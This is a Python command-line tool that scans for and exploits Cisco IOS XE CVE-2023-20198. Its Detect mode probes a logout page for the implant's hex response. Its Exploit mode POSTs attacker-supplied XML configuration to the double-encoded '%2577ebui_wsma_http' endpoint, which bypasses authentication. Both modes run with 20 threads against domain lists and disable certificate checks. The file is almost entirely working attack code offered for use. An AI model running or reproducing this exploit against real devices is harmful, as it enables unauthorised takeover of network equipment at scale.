import requests 
from colorama import Fore ,  Style , Back
import concurrent.futures
import random
import argparse
import os 
import urllib3
import time
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

requests.packages.urllib3.disable_warnings()

red =  Fore.RED

green = Fore.GREEN

magenta = Fore.MAGENTA

cyan = Fore.CYAN

mixed = Fore.RED + Fore.BLUE

blue = Fore.BLUE

yellow = Fore.YELLOW

white = Fore.WHITE

reset = Style.RESET_ALL

bold = Style.BRIGHT

target_list = []

colors = [ green, cyan, blue]

random_color = random.choice(colors)


def banner():
    
    banner = f"""{bold}{random_color}

    ______     ____  __         _ ______         
   / ____/  __/ __ \/ /  ____  (_)_  __/__  _____
  / __/ | |/_/ /_/ / /  / __ \/ / / / / _ \/ ___/
 / /____>  </ ____/ /__/ /_/ / / / / /  __/ /    
/_____/_/|_/_/   /_____|____/_/ /_/  \___/_/     
                                                   
                                            
                      Author   : D.SanjaiKumar @CyberRevoltSecurities  
                                              
                      Github   : https://github.com/sanjai-AK47
                      
                      LinkedIN : https://www.linkedin.com/in/d-sanjai-kumar-109a7227b/    
                                               

    {reset}"""
    word ="                     Exploiter an Exploitation and Detection Tool for CVE-2023-20198\n"


    print(banner)
    for char in word:
        print(f"{bold}{random_color}{char}{reset}", end='', flush=True)
        time.sleep(0.1)


parser = argparse.ArgumentParser(description=f"[{bold}{blue}DESCTIPTION{reset}]: {bold}{white}Exploitation and Detection tool for Cisco CVE-2023-20198{reset}")

subparser = parser.add_subparsers(title=f"[{bold}{bold}{blue}MODE{reset}]: {bold}{white}Exploitation | Detections  Modes{reset}", dest="mode", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Select either Exploit or Detect mode{reset}")

detect = subparser.add_parser("Detect", help=f"[{bold}{blue}INFO{reset}]: Detection mode detect the vulnerable implant to exploit")

detect.add_argument("-d", "--domain", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Target domain for exploiting without protocol eg:(www.domain.com){reset}", type=str)

detect.add_argument("-dL", "--domains-list", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Targets domain for exploiting without protocol eg:(www.domain.com){reset}", type=str)

detect.add_argument("-px", "--proxy", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching proxy will send request to your configured proxy (eg: BURPSUITE){reset}", type=str)

detect.add_argument("-to", "--time-out", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching timeout will requests till for your timeout and also for BURPSUITE{reset}", type=int)

detect.add_argument("-o", '--output', help=f"[{bold}{blue}INFO{reset}]: {bold}{white}File name to save output", type=str)

detect.add_argument("-v", "--verbose", help=f"[{bold}{blue}INFO{reset}]: Switching verbose will shows failed and offline targets", action="store_true")

exploit= subparser.add_parser("Exploit", help=f"[{bold}{blue}INFO{reset}]: Exploitation mode exploit the vulnerable implant of CVE-2023-20198")

exploit.add_argument("-cfc", "--config-content", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Customized config contents for exploitation{reset}", type=str)

exploit.add_argument("-d", "--domain", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Target domain for exploiting without protocol eg:(www.domain.com){reset}", type=str)

exploit.add_argument("-dL", "--domains-list", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Targets domain for exploiting without protocol eg:(www.domain.com){reset}", type=str)

exploit.add_argument("-px", "--proxy", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching proxy will send request to your configured proxy (eg: BURPSUITE){reset}", type=str)

exploit.add_argument("-to", "--time-out", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching timeout will requests till for your timeout and also for BURPSUITE{reset}", type=int)

exploit.add_argument("-o", '--output', help=f"[{bold}{blue}INFO{reset}]: {bold}{white}File name to save output", type=str)

exploit.add_argument("-v", "--verbose", help=f"[{bold}{blue}INFO{reset}]: Switching verbose will shows failed and offline targets", action="store_true")

args = parser.parse_args()



def exploit_https(url):
    
    
    try:
        
        proxies = {
            
            "http": f"{args.proxy}",
            "https": f"{args.proxy}"
        } if args.proxy else None
        
        timeout = args.time_out if args.time_out else 10
        
        pass_url = url
        
        modified_url = f"https://{url}"
        
        base_url =f"https://{url}/%2577ebui_wsma_http"
        
        data = args.config_content
        
        if not url.startswith("http://") and not url.startswith("https://"):
        
            response = requests.post(base_url, data=data, timeout=timeout, verify=False, proxies=proxies)
            
        else:
            
            response = requests.post(f"{url}/%2577ebui_wsma_http", data=data, timeout=timeout, verify=False, proxies=proxies)
         
        
        if response.status_code == 200:
            
            
            print(f"\n[{bold}{green}EXPLOITED{reset}]: {bold}{white}Exploited target: {url} ======> [ {bold}{blue}{response.text}{reset} ]{reset} ")
            
            exploit_save(url, response.text)
            
        else:
            
            print("\n")
        
            print(f"[{bold}{blue}UNEXPLOITED{reset}]: {bold}{white}Failed to exploit looks like not vulnerable to CVE-2023-20198: {pass_url} {reset}")
            
            
    except requests.exceptions.RequestException as e:
        
        exploit_http(pass_url)
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass 
        
        
def exploit_http(url):
    
    
    try:
        
        proxies = {
            
            "http": f"{args.proxy}",
            "https": f"{args.proxy}"
        } if args.proxy else None
        
        timeout = args.time_out if args.time_out else 10
        
        pass_url = url
        
        modified_url = f"http://{url}"
        
        base_url =f"http://{url}/%2577ebui_wsma_http"
        
        data = args.config_content
        
        if not url.startswith("http://") and not url.startswith("https://"):
        
            response = requests.post(base_url, data=data, timeout=timeout, verify=False, proxies=proxies)
            
        else:
            
            response = requests.post(f"{url}/%2577ebui_wsma_http", data=data, timeout=timeout, verify=False, proxies=proxies)
        
         
        if response.status_code == 200:
            
            
            print(f"\n[{bold}{blue}EXPLOITED{reset}]: {bold}{white}Exploited target: {url} ======> [ {bold}{blue}{response.text}{reset} ]{reset} ")
            
            exploit_save(url, response.text)
                
        else:
            
        
            print(f"\n[{bold}{blue}UNEXPLOITED{reset}]: {bold}{white}Failed to exploit looks like not vulnerable to CVE-2023-20198: {pass_url} {reset}")
            
    except requests.exceptions.RequestException as e:
        
        if args.verbose:
        
        
            print(f"\n[{bold}{red}OFFLINE{reset}]: {bold}{white}Failed looks target is {url}  offline{reset}")
        
            pass
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass 
  
def exploit_save(url,response):
    
    try:
    
        if args.output:
            
            if os.path.isfile(args.output):
                
                filename = args.output
                
            elif os.path.isdir(args.output):
                
                filename = os.path.join(args.output, f"exploitation_results.txt")
                
            else:
                
                filename = args.output
                
        if not args.output:
            
            filename = f"exploitation_results.txt"
            
        
        with open(filename, "a") as w:
            
            w.write(f"Vulneable Taget: {url} | Response : [ {response} ]"+ '\n')
            
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    
def detect_save(url):
    
    try:
    
        if args.output:
            
            if os.path.isfile(args.output):
                
                filename = args.output
                
            elif os.path.isdir(args.output):
                
                filename = os.path.join(args.output, f"detection_results.txt")
                
            else:
                
                filename = args.output
                
        if not args.output:
            
            filename = f"detection_results.txt"
            
        
        with open(filename, "a") as w:
            
            w.write(f"{url}"+ '\n')
            
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    
    
def is_vuln(url):
    
    try:
        
    
        return bool(re.match(r'^[0-9a-fA-F]+$', url))
    
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    
    
    
def detect_https(url):
    
    
    try:
        
        proxy = {
            
            "http": f"{args.proxy}",
            
            "https": f"{args.proxy}"
        }
        
        proxies = proxy if args.proxy else None
        
        timeout = args.time_out if args.time_out else 10
        
        pass_url = url
        
        
        modified_url = f"https://{url}"
        
        base_url =f"https://{url}/webui/logoutconfirm.html?logon_hash=1"
        
        if not url.startswith("http://") and not url.startswith("https://"):
        
            response = requests.get(base_url, timeout=timeout, verify=False, proxies=proxies)
            
        else:
            
            response = requests.get(url, timeout=timeout, verify=False, proxies=proxies)
         
        
        if response.status_code == 200:
            
            
            if is_vuln(response.text):
            
    
                print(f"\n[{bold}{green}SUCCESS{reset}]: {bold}{white} Vulnerable implant detected for CVE-2023-20198\n")
                
                detect_save(url)
                
            else :
                
                print(f"\n[{bold}{blue}UNSUCCESS{reset}]: {bold}{white}Target {url} implant is not vulnerable to CVE-2023-20198{reset}")
            
            
            
        else:
            
        
            print(f"\n[{bold}{red}FAILED{reset}]: {bold}{white}Failed to detect looks like not vulnerable to CVE-2023-20198: {url} {reset}")
            
    except requests.exceptions.RequestException as e:
        
        detect_http(url)
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        print(e)
        
        
def detect_http(url):
    
    
    try:
        
        proxies = {
            
            "http": f"{args.proxy}",
            
            "https": f"{args.proxy}"
        } if args.proxy else None
        
        timeout = args.time_out if args.time_out else 10
        
        pass_url = url
        
        modified_url = f"http://{url}"
        
        base_url =f"http://{url}/webui/logoutconfirm.html?logon_hash=1"
        
        
        if not url.startswith("http://") and not url.startswith("https://"):
            
        
            response = requests.get(base_url, timeout=timeout, verify=False, proxies=proxies)
            
        else:
            
            response = requests.get(url, timeout=timeout, verify=False, proxies=proxies)
         
        
        if response.status_code == 200:
            
            
            if is_vuln(response.text):
            
    
                print(f"\n[{bold}{green}SUCCESS{reset}]: {bold}{white}Vulnerable implant detected for CVE-2023-20198: {url}\n")
                
                detect_save(url)
                
            else :
                
                print(f"\n[{bold}{blue}UNSUCCESS{reset}]: {bold}{white}Target {url} implant is not vulnerable to CVE-2023-20198{reset}")
            
            
            
        else:
            
        
            print(f"\n[{bold}{red}FAILED{reset}]: {bold}{white}Failed to detect looks like not vulnerable to CVE-2023-20198: {url} {reset}")
            
    except requests.exceptions.RequestException as e:
        
        if args.verbose:
        
            print(f"\n[{bold}{red}OFFLINE{reset}]: {bold}{white}Failed looks target is {url}  offline{reset}")
        
            pass
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    
    
def speed_exploit(urls):
    
    try:
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            
            futures = [executor.submit(exploit_https, url)for url in urls]
            
        concurrent.futures.wait(futures)
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
        
def speed_detect(urls):
    
    
    
    try:
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            
            
            futures = [executor.submit(detect_https, url)for url in urls]
            
        concurrent.futures.wait(futures)
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
    
    
def exploiation():
    
    try:
        
        if args.domain and args.config_content:
        
            url =  args.domain 
        
            target_list.append(url)
        
            speed_exploit(target_list)
                
        elif args.domain and not args.config_content:
            
            print(f"[{bold}{red}FLAG-ERROR{reset}]: {bold}{white}Please Enable --config-content flag and xml content for Exploiting Cisco CVE-2023-20198{reset}")
            
            exit()
        
        if args.domains_list and args.config_content:
        
            try:
            
                filename= args.domains_list
            
                with open(filename, "r") as url:
                
                    urls = url.read().split()
                
                for url in urls:
                
                    target_list.append(url)
                
                
                speed_exploit(target_list)

            
            except FileNotFoundError as e:
            
                print(f"[{bold}{red}ALERT{reset}]: {bold}{white}File not Found please check the file exits or not{reset}")
            
                exit()
            
            except KeyboardInterrupt as e:
        
                print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
                exit()
        
            except Exception as e:
        
                print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
                
        elif args.domains_list and not args.config_content:
            
            print(f"[{bold}{red}FLAG-ERROR{reset}]: {bold}{white}Please Enable --config-content flag and xml content for Exploiting Cisco CVE-2023-20198{reset}")
            
            exit()
            
        if not args.domain and not args.domains_list:
        
        
            print(f"[{bold}{red}FLAG-ERROR{reset}]: {bold}{white}Please provide a domain or domains list for exploit{reset}")
            
    except KeyboardInterrupt as e:
        
                print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
                exit()
        
    except Exception as e:
        
                print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
                

def detection():
    
    try:
        
        if args.domain and not args.domains_list:
        
            url =  args.domain 
        
            target_list.append(url)
        
            speed_detect(target_list)
                
        
        if args.domains_list and not args.domain:
            
        
            try:
                
            
                filename= args.domains_list
            
                with open(filename, "r") as url:
                
                    urls = url.read().split()
                
                for url in urls:
                
                    target_list.append(url)
                
                
                speed_detect(target_list)

            
            except FileNotFoundError as e:
            
                print(f"[{bold}{red}ALERT{reset}]: {bold}{white}File not Found please check the file exits or not{reset}")
            
                exit()
            
            except KeyboardInterrupt as e:
        
                print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
                exit()
        
            except Exception as e:
        
                print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
                
            
        if not args.domain and not args.domains_list:
        
        
            print(f"[{bold}{red}FLAG-ERROR{reset}]: {bold}{white}Please provide a domain or domains list for exploit{reset}")
            
    except KeyboardInterrupt as e:
        
                print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
                exit()
        
    except Exception as e:
        
                print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
                
                
def main():
    
    try:
        
        banner()
        
        if args.mode == "Detect" :
            
            #print("Im calling detect")
            
            detection()
            
        elif args.mode == "Exploit" :
            
            exploiation()
               
        if not args.mode == "Detect" and not args.mode == "Exploit" :
            
            print(f"\n[{bold}{red}MODE-ERROR{reset}]: {bold}{white}Please Provide either Exploit or Detect mode{reset}")
            
            exit()
            
    except KeyboardInterrupt as e:
        
                print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
                exit()
        
    except Exception as e:
        
                print(f"\n[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
                
                
if __name__ == "__main__" :
    
    main()
    
    





    


    

    



    
    


    
    


